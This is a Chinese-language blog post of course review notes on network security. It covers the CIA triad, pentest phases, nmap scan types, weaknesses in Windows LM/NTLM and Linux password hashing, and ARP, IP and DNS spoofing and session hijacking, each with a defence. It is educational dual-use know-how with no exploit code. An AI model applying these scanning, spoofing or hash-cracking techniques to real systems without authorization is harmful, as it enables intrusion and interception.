<html>

<head>
  <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CyberSec Course Review Memo | 3ND</title>
<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627826313347">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="CyberSec Course Review Memo | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="0x01 网络安全概论
网络不安全的原因：自身缺陷 + 开放性 + 黑客攻击。
网络安全的威胁来源

CIA 三元组与网络安全基本需求

机密性、完整性、可用性三者相互依存，形成一个不可分割的整体，三者中任何一个的损害都将影响到整个安全系统..." />
    <meta name="keywords" content="Course" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
    <script src="/media/highlight.min.js"></script>
</head>

<body>
  <div class="main">
    <div class="main-content">
      <div class="site-header">
  <a href="https://3nd.xyz">
  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627826313347" alt="">
  </a>
  <h1 class="site-title">
    3ND
  </h1>
  <p class="site-description">
    夏が終わった
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    <a href="https://github.com/inspiringz" target="_blank">
      <i class="ri-github-fill"></i>
    </a>
    <a href="mailto:z@3nd.xyz" target="_blank">
      <i class="ri-mail-send-fill"></i>
  </a>
  <a href="#">
    <i class="ri-fire-fill"></i>
</a>
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              CyberSec Course Review Memo
            </h2>
            <div class="post-info">
              <span>
                2019-12-09
              </span>
              <span>
                54 min read
              </span>
              <span class="page-view" key="20191209082241" title="CyberSec Course Review Memo">
              </span>
              
                <a href="https://3nd.xyz/tag/course/" class="post-tag">
                  # Course
                </a>
                
            </div>
            
                <div class="post-content-wrapper">
                  <div class="post-content">
                    <h2 id="0x01-网络安全概论">0x01 网络安全概论</h2>
<p>网络不安全的原因：自身缺陷 + 开放性 + 黑客攻击。</p>
<h3 id="网络安全的威胁来源">网络安全的威胁来源</h3>
<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/2019-12-09-08-59-48.png" alt="" loading="lazy"></figure>
<h3 id="cia-三元组与网络安全基本需求">CIA 三元组与网络安全基本需求</h3>
<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/2019-12-09-09-02-17.png" alt="" loading="lazy"></figure>
<p>机密性、完整性、可用性三者相互依存，形成一个不可分割的整体，三者中任何一个的损害都将影响到整个安全系统。</p>
<ul>
<li>Confidentiality 机密性</li>
</ul>
<p>机密性是防止未授权的用户访问数据，简单来说就是<strong>不能看</strong>。</p>
<p>为了维护机密性，通常会在数据的处理、传输、储存过程中进行一些诸如加密或者权限类的保护措施来进行安全控制。</p>
<p>针对机密性的破坏主要包括窃取密码文件、社会工程学、嗅探、肩窥等。</p>
<ul>
<li>Integrity 完整性</li>
</ul>
<p>完整性是防止未授权的修改数据，也就是<strong>不能改</strong>。</p>
<p>针对完整性的破坏主要有病毒、应用程序错误、逻辑炸弹，以及被授权用户的非授权操作。</p>
<p>所以，为了保护完整性，要进行严格的访问控制，严格的身份认证以及严密的人员培训。</p>
<p>完整性依赖于机密性，如果没有机密性，也就无法维护完整性。</p>
<ul>
<li>Availability 可用性</li>
</ul>
<p>可用性是保证经过授权的客户能及时准确的不间断的访问数据，也就是<strong>一直用</strong>。</p>
<p>针对破坏可用性的威胁主要有设备故障、软件错误、包括一些不可抗力如洪水、火灾等。再企业中，造成可用性破坏的最主要原因是人为错误，疏忽或失职造成的如意外删除文件、私自分配资源、安全策略配置错误等。</p>
<p>可用性依赖于完整性和机密性。</p>
<p><strong>* 网络安全基本需求</strong>：机密性、完整性、可用性、可控性、不可抵赖性。</p>
<ul>
<li>可控性</li>
</ul>
<p>可控性是人们对信息的传播路径、范围及其内容所具有的控制能力，即不允许不良内容通过公共网络进行传输，使信息在合法用户的有效掌控之中。</p>
<ul>
<li>不可抵赖性</li>
</ul>
<p>不可抵赖性也称不可否认性。在信息交换过程中，确信参与方的真实同一性，即所有参与者都不能否认和抵赖曾经完成的操作和承诺。简单地说，就是发送信息方不能否认发送过信息，信息的接收方不能否认接收过信息。利用信息源证据可以防止发信方否认已发送过信息，利用接收证据可以防止接收方事后否认已经接收到信息。数据签名技术是解决不可否认性的重要手段之一。</p>
<h3 id="网络攻击类型">网络攻击类型</h3>
<p>从安全属性上分类：阻断攻击、截取攻击、篡改攻击、伪造攻击、重放攻击。</p>
<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/2019-12-09-09-11-31.png" alt="" loading="lazy"></figure>
<p>从攻击方式上分类：主动攻击、被动攻击。</p>
<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/2019-12-09-09-13-36.png" alt="" loading="lazy"></figure>
<h3 id="osi-安全体系">OSI 安全体系</h3>
<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/2019-12-09-09-22-52.png" alt="" loading="lazy"></figure>
<p>5 类安全服务：<strong>机密性、完整性、不可否认性、访问控制、认证</strong>。</p>
<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/2019-12-09-09-22-01.png" alt="" loading="lazy"></figure>
<p>8 种安全机制：<strong>加密、数字签名、访问控制、信息完整性、鉴别交换、业务量填充、路由控制、公证</strong>。</p>
<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/2019-12-09-09-22-35.png" alt="" loading="lazy"></figure>
<h3 id="等级保护制度">等级保护制度</h3>
<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/2019-12-09-09-29-05.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>第一级别：用户自主保护级。</p>
</li>
<li>
<p>第二级别：系统审计保护级。</p>
</li>
<li>
<p>第三级别：安全标记保护级。</p>
</li>
<li>
<p>第四级别： 结构化保护级。</p>
</li>
<li>
<p>第五等级：访问验证保护级。</p>
</li>
</ul>
<h2 id="0x02-黑客攻击流程-渗透测试">0x02 黑客攻击流程 &amp; 渗透测试</h2>
<h3 id="黑客攻击流程">黑客攻击流程</h3>
<ul>
<li>破坏型</li>
</ul>
<pre><code class="language-bash">踩点 -&gt; 扫描 -&gt; 查点 -&gt; 获取访问权 -&gt; 拒绝服务
</code></pre>
<ul>
<li>入侵型</li>
</ul>
<pre><code class="language-bash">踩点 -&gt; 扫描 -&gt; 查点 -&gt; 获取访问权 -&gt; 提权 -&gt; 窃取信息 -&gt; 掩踪灭迹 -&gt; 创建后门
</code></pre>
<h3 id="踩点">踩点</h3>
<p>踩点(footprinting): 信息收集过程（开源情报，Open Source Intelligence，OSINT）—— 被动侦查阶段，在一个区域内寻找有用信息，从公开渠道查出目标使用的<strong>域名</strong>、<strong>网络地址块</strong>、<strong>IP地址</strong>以及与<strong>信息安防现状</strong>有关的其他细节等。</p>
<p>踩点的途径：公开渠道获取信息、Whois 查询、DNS 查询、网络侦查。</p>
<p>* Google Hacking - 搜索引擎技巧：</p>
<ul>
<li>
<p>与：<code>空格</code> 或 <code>AND</code>；或：<code>OR</code> ；非：<code>-</code>；</p>
</li>
<li>
<p>site、inurl、allinurl、intitle、allintitle；</p>
</li>
<li>
<p>link（所有链接到某个 URL 地址的网页）；</p>
</li>
<li>
<p>related （相似页面）、cache（快照）、info（相关信息）。</p>
</li>
</ul>
<p>* 扫描：确定目标系统是否真实存在、确定目标系统上哪些服务正在运行或监听、探查操作系统。</p>
<p>* 查点：对是被出来的服务进行充分探查，寻找用户账户名、错误配置的共享资源、具有已知安全性漏洞的旧版本软件等。</p>
<p>* 攻击：破坏性攻击主要使用工具发起攻击、入侵性攻击则利用收集到的信息，找出其系统漏洞，然后利用漏洞获取尽可能高的权限。</p>
<p>* 隐藏踪迹：最简单的就是删除日志文件，更常用的办法是只对日志中有关自己的部分做修改，更高级的办法如替换系统程序（替换正常程序的程序称之为 rookit）。</p>
<h3 id="渗透测试步骤">渗透测试步骤</h3>
<p>渗透测试（Pentration Testing）：一种通过模拟攻击者的技术与方法，挫败目标系统的安全控制措施并获取访问控制权的安全测试方法。</p>
<p>渗透测试执行标准（PTES: Pentration Testing Execution Standard）：</p>
<ol>
<li><strong>前期交互</strong>阶段（Pre-Engagement Interaction）</li>
</ol>
<p>确定渗透测试范围、目标、限制条件与服务合同细节。</p>
<ol start="2">
<li><strong>情报收集</strong>阶段（Information Gathering）</li>
</ol>
<p>获取目标网络拓扑、系统配置、安全防御措施等信息。</p>
<ol start="3">
<li><strong>威胁建模</strong>阶段（Threat Modeling）</li>
</ol>
<p>针对获取的信息进行威胁建模与攻击规划。</p>
<ol start="4">
<li><strong>漏洞分析</strong>阶段（Vulnerability Analysis）</li>
</ol>
<p>综合分析汇总的情报信息，从漏扫结果、服务查点信息等，找出可实施攻击的点。</p>
<ol start="5">
<li><strong>渗透攻击</strong>阶段（Exploitation）</li>
</ol>
<p>利用找出的系统漏洞入侵系统，获取访问控制权限。</p>
<ol start="6">
<li><strong>后渗透</strong>阶段（Post Exploitation）</li>
</ol>
<p>根据目标组织业务经营模式、保护资产形式等自主设计攻击目标，寻找客户组织最具价值和尝试安全保护的信息和资产，最终实施能造成重要业务影响的攻击。</p>
<ol start="7">
<li><strong>报告</strong>阶段（Reporting）</li>
</ol>
<p>凝聚所有阶段获取到的关键情报信息、探测和发掘出的系统安全漏洞、成功的渗透过程，同时站在防御者角度上分析安全体系中最薄弱的环节及修补与升级技术方案。</p>
<p>* 常用的命令与工具:</p>
<pre><code class="language-bash">ping, nslookup, host, hostnew, traceroute(tracert), nmap, telnet, net, dig, whois
</code></pre>
<h2 id="0x03-网络扫描与查点技术">0x03 网络扫描与查点技术</h2>
<h3 id="扫描的基本步骤">扫描的基本步骤</h3>
<pre><code class="language-bash">确定目标系统是否真实存在 -&gt; 确定目标系统上哪些服务正在运行或监听 -&gt; 探查操作系统
</code></pre>
<h3 id="端口扫描的类型">端口扫描的类型</h3>
<ol>
<li>TCP 连接扫描（TCP Connect）：<code>nmap -sT</code></li>
</ol>
<p>连接目标端口并完成一次完整的三次握手过程，很容易被目标系统察觉。</p>
<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/2019-12-09-10-23-47.png" alt="" loading="lazy"></figure>
<ol start="2">
<li>TCP SYN 扫描（半开扫描）：<code>nmap -sS</code></li>
</ol>
<p>向目标端口发送 SYN 数据包，返回 SYN/ACK 数据包则可断定该端口出于监听状态，返回 RST/ACK 数据包则表明该端口不在监听状态，然后发送 RST/ACK 数据包（使通信双方不会建立一条完整连接）。<br>
优点：更隐蔽，目标系统一般不会将其记入日志。<br>
缺点：半开连接过多时，会形成一种“拒绝服务”条件而引起对方的警觉。</p>
<ol start="3">
<li>TCP FIN 扫描（秘密扫描）：<code>nmap -sF</code></li>
</ol>
<p>向目标端口发送 FIN 数据包，如果目标端口关闭，目标系统返回 RST 数据包，否则丢弃该包。通常只对 Unix 系统的 TCP/IP 栈有效，Windows 平台下总是返回 RST 包。<br>
优点：FIN 数据包能通过监测 SYN 包的包过滤器，由于不包含 TCP 三次握手协议的任何部分，所以无法被记录下来，比 SYN 扫描更加隐蔽。</p>
<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/2019-12-09-10-50-56.png" alt="" loading="lazy"></figure>
<p>* 两个变种：</p>
<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/move/2019-12-09-10-55-37.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>TCP Xmas 扫描（圣诞树扫描）：<code>nmap -sX</code></p>
<p>TCP 包包头设置所有标志位，目标端口关闭则返回 RST 数据包。</p>
</li>
<li>
<p>TCP Null 扫描（空扫描）：<code>namp -sN</code></p>
<p>关闭掉所有的标志，目标系统关闭则返回 RST 数据包。</p>
</li>
</ul>
<ol start="4">
<li>TCP ACK 扫描：<code>nmap -sA</code></li>
</ol>
<p>测试防火墙的规则集。判断防火墙是简单的<strong>包过滤防火墙</strong>，还是高级的、具备数据包过滤功能的<strong>状态（Stateful）防火墙</strong>，不能用来确定端口的开放状态。</p>
<ol start="5">
<li>TCP 窗口扫描：<code>nmap -sW</code></li>
</ol>
<p>测试特定目标系统（如 AIX 和 FreeBSD 系统）上的端口是否开放、被过滤，会导致目标系统返回不同的 TCP 窗口长度值。</p>
<ol start="6">
<li>TCP Maimon 扫描：<code>nmap -sM</code></li>
</ol>
<p>探测报文改为 FIN/ACK 外，其原理与 TCP FIN 扫描一样，无论端口是否开放，都响应 RST 报文，如果端口开放，许多 BSD 的系统只是丢弃该报文。</p>
<ol start="7">
<li>UDP 扫描：<code>nmap -sU</code></li>
</ol>
<p>向目标端口发送 UDP 数据包，如返回 <strong>ICMP port unreachable</strong> 出错消息，表明端口关闭，如果没有收到该消息，端口可能开放。</p>
<p>remark：UDP 不要求必须建立一条连接，所以扫描的准确性取决于与目标网络的使用情况和过滤机制有关的许多因素，扫描结果不可靠。</p>
<h3 id="扫描的防御">扫描的防御</h3>
<ul>
<li>
<p><strong>在某个不常用的端口进行监听</strong>，如发现对该端口的连接请求，就认为有端口扫描。一般这些工具都会对连接请求的来源进行反探测，同时弹出提示窗口。</p>
</li>
<li>
<p><strong>混杂模式下抓包</strong>（Wireshark）并进一步分析判断。</p>
</li>
<li>
<p><strong>蜜罐系统</strong>（Honeypot），本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。</p>
</li>
<li>
<p><strong>审计技术</strong>（Auditing），使用系统记录下的<strong>使用时间、敏感操作和违纪操作</strong>等，为系统进行事故原因查询、事故发生后的实时处理提供详细可靠的依据或支持。</p>
</li>
</ul>
<h2 id="0x04-口令破解与防御">0x04 口令破解与防御</h2>
<h3 id="常用的口令破解方法">常用的口令破解方法</h3>
<ul>
<li>
<p><strong>暴力破解</strong>（Brute force）：穷举，速度慢。</p>
</li>
<li>
<p><strong>字典攻击</strong>：根据用户信息建议起一个用户可能使用的口令列表文件，速度快。</p>
</li>
<li>
<p><strong>组合攻击</strong>：在字典的基础上增加几个字母或数字进行攻击。</p>
</li>
<li>
<p>社会工程学（Social engineering）</p>
</li>
<li>
<p>偷窥、网络嗅探、木马、口令蠕虫、搜索垃圾箱、重放等。</p>
</li>
</ul>
<h3 id="windows-口令安全">Windows 口令安全</h3>
<h4 id="security-account-manager">Security Account Manager</h4>
<p>安全机制：安全账户管理器 SAM (Security Account Manager) 机制。</p>
<p>SAM 文件包含本地系统或所在控制域上所有<strong>用户名</strong>和<strong>口令的 Hash 值</strong>。SAM 文件路径：</p>
<pre><code class="language-sh">%systemroot%system32\config
</code></pre>
<p>创建口令 Hash 有两种办法：</p>
<ul>
<li>
<p>LAN Manager（LM）——— 最早使用的密码 Hash 算法之一；</p>
</li>
<li>
<p>NT LAN Manager v2（NTLMv2）——— Windows 2000、xp、Vista、7 等；</p>
</li>
</ul>
<p>* remark: 新 OS 支持使用 LM 哈希，主要是提供<strong>向后兼容性</strong>，在 Windows Vista/7/8... 中默认被禁用。</p>
<h4 id="lan-manager">LAN Manager</h4>
<p>Windows 下的 Hash 密码格式：</p>
<pre><code class="language-sh">用户名:RID:LM-Hash值:NT-Hash值
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://3nd.xyz/post-images/move/2019-12-09-16-15-21.png" alt="" loading="lazy"></figure>
<p>*安全标示 RID：在账户创建时被创建；账户删除时删除，即使用户名相同，每次创建时获得的 RID 也不相同。</p>
<p><strong>* LM 哈希步骤</strong>:</p>
<ol>
<li>
<p>将用户的口令全转化为大写字母， 添加空字符（null），直至口令长度等于 <strong>14-byte</strong> 字符；</p>
</li>
<li>
<p>将新获得的口令拆分成两组 7-byte 的对分；</p>
</li>
<li>
<p>分别经 str_to_key() 函数处理创建两个 7-byte DES 加密密钥，并为每一组添加奇偶校验位，即可创建出 64-bit 的密钥；</p>
</li>
<li>
<p>使用每个 DES 密钥加密一个预定义的魔术字符串(<code>KGS!@#$%</code>)，获得两个 8-byte 密文值；</p>
</li>
<li>
<p>密文值链接组成 16 字节的值，即最终获得的 LM 哈希值。</p>
</li>
</ol>
<figure data-type="image" tabindex="13"><img src="https://3nd.xyz/post-images/move/2019-12-09-16-26-39.png" alt="" loading="lazy"></figure>
<p><strong>* LM Hash 缺陷</strong>:</p>
<ol>
<li>
<p>DES 算法密钥太短 (56bit)；</p>
</li>
<li>
<p>14-byte ASCII（95^14） -&gt; 2 * 7-byte （95^7），不区分大小写 -&gt; 69 ^ 7，在暴力破解面前不堪一击；</p>
</li>
<li>
<p>口令长度 &lt; 7 时，第二部分的 Hash 为固定值，容易确定密码的长度范围；</p>
</li>
<li>
<p>Hash 值在通过网络发送到服务器时，没有进行 salting 操作，容易受 <strong>中间人攻击</strong> 和 <strong>重放攻击</strong>。</p>
</li>
</ol>
<p>* 中间人攻击 MITM（Man-in-the-middle attack）在密码学和计算机安全领域中是指攻击者与通讯的两端分别建立独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。</p>
<figure data-type="image" tabindex="14"><img src="https://3nd.xyz/post-images/move/2019-12-09-16-40-32.png" alt="" loading="lazy"></figure>
<h4 id="nt-lan-manager-v2">NT LAN Manager v2</h4>
<p>NTLMv2 从 Windows NT 4 开始备用作全新的身份验证方法：</p>
<figure data-type="image" tabindex="15"><img src="https://3nd.xyz/post-images/move/2019-12-09-16-44-06.png" alt="" loading="lazy"></figure>
<h4 id="登录与身份认证">登录与身份认证</h4>
<p><strong>一、登录</strong></p>
<ol>
<li>交互式认证</li>
</ol>
<p>向<strong>本地计算机</strong>或<strong>域（Domain）账户</strong>确定用户的身份。</p>
<ul>
<li>
<p>本地计算机</p>
<p>可使用存储在本地的 SAM 中的口令散列值进行登录。</p>
</li>
<li>
<p>域账户登录</p>
<p>默认使用 Kerberos V5。</p>
</li>
</ul>
<ol start="2">
<li>网络登录</li>
</ol>
<p>对用户尝试访问的网络服务或资源提供用户验证。</p>
<p><strong>二、身份认证</strong></p>
<ol>
<li>LM &amp; NTLMv1</li>
</ol>
<figure data-type="image" tabindex="16"><img src="https://3nd.xyz/post-images/move/2019-12-09-16-51-11.png" alt="" loading="lazy"></figure>
<ol start="2">
<li>NTLM 身份认证机制</li>
</ol>
<figure data-type="image" tabindex="17"><img src="https://3nd.xyz/post-images/move/2019-12-09-16-51-51.png" alt="" loading="lazy"></figure>
<p>在登录前，客户端会<strong>缓存</strong>输入口令的 Hash 值，明文口令丢弃。</p>
<ol start="3">
<li>NTLMv2 身份认证过程</li>
</ol>
<figure data-type="image" tabindex="18"><img src="https://3nd.xyz/post-images/move/2019-12-09-16-53-25.png" alt="" loading="lazy"></figure>
<h3 id="linux-口令安全">Linux 口令安全</h3>
<p><code>/etc/passwd</code>：包含了用户名、用户名的真实姓名、标识信息以及每个用户的基本信息，各个域之间用 <code>:</code> 分隔，加密密码位置一般单独放在 Shadow 文件中。</p>
<figure data-type="image" tabindex="19"><img src="https://3nd.xyz/post-images/move/2019-12-09-16-57-52.png" alt="" loading="lazy"></figure>
<p>过去 Unix 通过一个单向函数 crypt() 对密码进行加密并保存该加密值。crypt() 函数基于 DES 算法，使用用户口令作为 DES 加密密钥（用户口令的前 8-byte 字符，每个字符各取最低 7-bit，共 56-bit），加密一个全零的 64 位块，然后再对密文结果进行加密，共加密 25 次，最后的 64-bit 密文被划分为 11-byte 可打印字符，并保存起来。每个字符表示 6 位，然后可顺序表示成 <strong><code>a-zA-Z0-9./</code></strong> 等 64 个字符。</p>
<p>现在 Unix Salt：Morris 和 Thompson 对 DES 算法进行了修改，增加了 salt 位（2 个字符的字符串 <strong><code>a-zA-Z0-9./</code></strong>，每个字符表示 6 位，共 4096 种可能。当用户改变口令时，系统根据日期选取一个 salt 值，然后将该 salt 值转化为 2-byte 字符串，并连同加密后的口令一起保存起来。</p>
<p><strong>相同的口令 + 不同的 salt 值 = 不同的加密后的口令</strong></p>
<p>* crypt16(): 为提高 crypt() 函数的安全性，Unix 系统改变了 crypt() 函数的加密算法，使用如 Blowfish、MD5 等算法。</p>
<p><code>/etc/shadow</code>：影子密码文件，包含了加密过的密码以及密码失效的时间，该文件被保护起来，只有 root 用户才能读取。</p>
<figure data-type="image" tabindex="20"><img src="https://3nd.xyz/post-images/move/2019-12-09-17-14-33.png" alt="" loading="lazy"></figure>
<p>* Linux 常用命令</p>
<pre><code class="language-bash">chmod, ls, ps, passwd, su, sudo, su- 等
</code></pre>
<p><code>su</code> 与 <code>su -</code>: su 不会更换当前目录等信息，<code>su -</code> 默认切换到 root 用户主目录，<code>su -c command</code> 以 root 权限执行一条命令后即终止 root 权限。</p>
<h3 id="口令破解的防御">口令破解的防御</h3>
<ol>
<li>
<p>提高口令的强度，加大攻击者破解的时间和难度。</p>
</li>
<li>
<p>阻止攻击者反复尝试的可能。</p>
</li>
</ol>
<h2 id="0x05-欺骗技术与防御">0x05 欺骗技术与防御</h2>
<h3 id="arp-欺骗">ARP 欺骗 📌</h3>
<figure data-type="image" tabindex="21"><img src="https://3nd.xyz/post-images/move/2019-12-09-17-41-45.png" alt="" loading="lazy"></figure>
<p>ARP 欺骗（ARP spoofing），又称 ARP 毒化（ARP poisoning）或 ARP 攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者 PC 的网关 MAC 地址，使访问者 PC 错以为攻击者更改后的 MAC 地址是网关的 MAC，导致网络不通。</p>
<p><strong>* ARP 缺陷</strong>：主机收到应答包后，<strong>不验证</strong>自己<strong>是否发送</strong>过对应的 ARP 请求，<strong>不验证</strong>该回应包<strong>是否可信</strong>，<strong>直接</strong>用应答包里面的信息<strong>替换</strong> ARP 缓存表中的原有信息。</p>
<p><strong>* ARP 欺骗的后果</strong>：</p>
<ol>
<li>
<p>导致同网段的其他用户无法正常上网（频繁断网或网速慢）；</p>
</li>
<li>
<p>嗅探交换式局域网内的所有数据包，从而获取敏感信息；</p>
</li>
<li>
<p>对信息进行篡改，修改重要信息，进而控制受害者会话。</p>
</li>
</ol>
<p><strong>* ARP 欺骗的检测</strong>：</p>
<ol>
<li>
<p>网络频繁掉线，网速莫名其妙的慢；</p>
</li>
<li>
<p>使用 <code>arp -a</code> 命令发现网关的的 MAC 地址与真实的网关 MAC 地址不同；</p>
</li>
<li>
<p>使用网络嗅探软件发现局域网内存在大量 ARP 响应包。</p>
</li>
</ol>
<p><strong>* ARP 欺骗的防御</strong>：</p>
<ol>
<li>
<p>MAC 地址绑定，使用静态的 ARP 缓存；</p>
</li>
<li>
<p>使用 ARP 服务器，使用 ARP 防火墙；</p>
</li>
<li>
<p>及时发现进行 ARP 欺骗的主机，将其进行隔离。</p>
</li>
</ol>
<h3 id="ip-欺骗">IP 欺骗 📌</h3>
<figure data-type="image" tabindex="22"><img src="https://3nd.xyz/post-images/move/2019-12-09-17-48-17.png" alt="" loading="lazy"></figure>
<p>IP 协议不是面向连接的，两台计算机的信任连接主要依靠双方的 IP 地址。在计算机网络里面，IP 地址欺骗或 IP 欺骗是指带有假的源 IP 地址的 IP 协议分组（数据报），目的是冒充另一个计算系统身份。使发送方可以保持匿名的一种技术是使用代理服务器。</p>
<p>IP spoofing (IP 欺骗)，一种涉及已建立的活动会话被他人截取和加入的攻击。IP 欺骗也是一种攻击方法，该方法使用捏造的源地址来发送 IP 数据包，此类数据包可能会采用可信源的 IP 地址来尝试绕过防火墙。这将使防火墙误以为来自黑客的数据包确实是来自可信源的。IP 欺骗也可以仅用于隐藏攻击的真实来源。</p>
<p>IP 欺骗是入侵者使用其他计算机的 IP 地址来获取信息或访问权限的过程。由于入侵者伪装成他人出现，因此如果发送回复，该回复将发往入侵者所伪造的地址，而非其真实地址。</p>
<p><strong>IP 欺骗的方式</strong>：</p>
<ol>
<li><strong>简单的 IP 地址修改</strong>；</li>
</ol>
<p>攻击者将 IP 地址修改为其他主机的地址，Inernet 为动态路由，攻击者不能得到返回的数据流。</p>
<ul>
<li>
<p>TCP: 受害主机收到一无所知的会话回复，将丢弃数据包，无法完成一次完整的 TCP 连接。</p>
</li>
<li>
<p>UDP: 无连接，数据包将发送到受害主机，导致拒绝服务。</p>
</li>
</ul>
<ol start="2">
<li><strong>源路由攻击</strong>（Source Routing）；</li>
</ol>
<figure data-type="image" tabindex="23"><img src="https://3nd.xyz/post-images/move/2019-12-09-18-11-15.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>宽松的源站选择（LSR）：发送端指明数据包必须经过的 IP 地址清单，但如果需要也可以经过其他地址；</p>
</li>
<li>
<p>严格的源站选择（SRS）：发送端指明数据包必须经过的确切 IP 地址，数据包如果没有经过这一确切路径，数据包将被丢弃，并返回 ICMP 报文。</p>
</li>
</ul>
<ol start="3">
<li><strong>TCP 会话劫持</strong>（Session Hijack）。</li>
</ol>
<figure data-type="image" tabindex="24"><img src="https://3nd.xyz/post-images/move/2019-12-09-18-15-52.png" alt="" loading="lazy"></figure>
<p>接管现存动态会话的过程，即攻击者可以代替原来的合法用户，同时监控并掌握会话内容。会话劫持结合了嗅探和欺骗技术，一般伴随着拒绝服务 DoS，且不依赖操作系统。</p>
<p>会话劫持过程：</p>
<ol>
<li>发现攻击目标：必须能检测目标主机的通信流；</li>
<li>确认会话状态：会话劫持一般在流量达到高峰时进行</li>
</ol>
<pre><code>- 攻击者可选择的会话比较多
- 掉线不容易引起用户的怀疑
</code></pre>
<ol start="3">
<li>猜测序列号</li>
</ol>
<pre><code>- TCP 仅通过 SEQ/ACK 序列号来区分正确/错误数据包
- 以某种方式扰乱客户机的 SEQ/ACK，使得服务器不再相信客户机的正确数据包，然后伪装成客户机，使用猜测的正确的 SEQ/ACK 序列号与服务器通信。
\* 扰乱方法：恰当的时间在通讯流中插入一个欺骗包，服务器接收后更新 ACK ，客户机对此毫无察觉，仍然使用 SEQ 通信。
</code></pre>
<ol start="4">
<li>使客户主机下线： DoS攻击</li>
<li>接管会话：攻击者在受害服务器上留下后门（创建账户）</li>
</ol>
<p><strong>IP 欺骗的防御</strong>：</p>
<ol>
<li>防范基本的 IP 欺骗：</li>
</ol>
<ul>
<li>入口过滤：不允许任何从外面进入网络的数据包使用单位内部地址作为源地址；</li>
<li>出口过滤：从内网主机到内网主机的流量不允许流到本网络之外。</li>
</ul>
<ol start="2">
<li>防范源路由欺骗</li>
</ol>
<p>设置路由器禁用源路由。</p>
<ol start="3">
<li>防范会话劫持</li>
</ol>
<p>没有有效的方法可以根本上防范会话劫持攻击，只能尽可能减少攻击带来的危害。</p>
<ul>
<li>加密；</li>
<li>使用安全协议：使用 SSH 而不使用 Telent。</li>
<li>限制保护：允许外网到内网的信息越少，内网越安全。</li>
</ul>
<h3 id="dns-欺骗">DNS 欺骗</h3>
<p><strong>原理及实现步骤</strong>：</p>
<p>当本地 DNS 服务器查询域名时，如果<strong>服务器缓存</strong>中已有响应的记录，就直接将这条记录返回给用户。DNS 欺骗的<strong>关键</strong>是在 DNS 服务器的本地 Cache 中缓存一条伪造的解析记录。</p>
<figure data-type="image" tabindex="25"><img src="https://3nd.xyz/post-images/move/2019-12-09-18-32-17.png" alt="" loading="lazy"></figure>
<p><strong>两种可能情况下的实现办法</strong>：</p>
<ol>
<li>本地域名服务器可控</li>
</ol>
<p>直接添加新的解析记录即可。</p>
<ol start="2">
<li>无法控制 DNS 服务器</li>
</ol>
<p>控制 DNS 服务器所在网络中的某台主机，并可以监听该网络中的通信情况。黑客要对远程的某 DNS 服务器进行欺骗：首先，黑客要冒充某个域名服务器的 IP 地址；其次，黑客要能预测目标域名服务器所发送的 DNS 的 <strong>ID 号</strong>。DNS 数据通过 UDP （53 端口）协议传递，通信过程往往是并行的，即域名服务器之间同时可能会进行多个解析过程，<strong>确定目标 DNS 服务器的 ID 号为 DNS 欺骗攻击的关键</strong>，请求方和应答方使用相同的 ID 号证明是同一个会话。</p>
<ul>
<li>对 DNS 服务器的网络进行<strong>嗅探</strong>，获取 ID 号；</li>
<li>向目标 DNS 服务器请求某个不存在的域名地址，冒充所请求域的 DNS 服务器，向目标 DNS 服务器连续发送应答包，包中的 ID 号依次增加，一段时间后再次向目标 DNS 服务器发送针对该域名的解析请求，如果得到返回结果，就说明目标 DNS 服务器接受了刚才的伪造应答，否则，再次尝试。</li>
</ul>
<figure data-type="image" tabindex="26"><img src="https://3nd.xyz/post-images/move/2019-12-09-18-48-20.png" alt="" loading="lazy"></figure>
<p><strong>DNS 欺骗的局限性</strong>：</p>
<ul>
<li>
<p>攻击者不能替换缓存中已存在的记录；</p>
</li>
<li>
<p>DNS 服务器存在缓存刷新时间问题；</p>
</li>
</ul>
<p><strong>配置 DNS 服务器时注意</strong>：</p>
<ul>
<li>
<p>使用最新版的 DNS 服务器软件并及时安装补丁；</p>
</li>
<li>
<p>关闭 DNS 服务器的递归功能，限制区域传输范围，限制动态更新，采用分层的 DNS 体系结构。</p>
</li>
</ul>
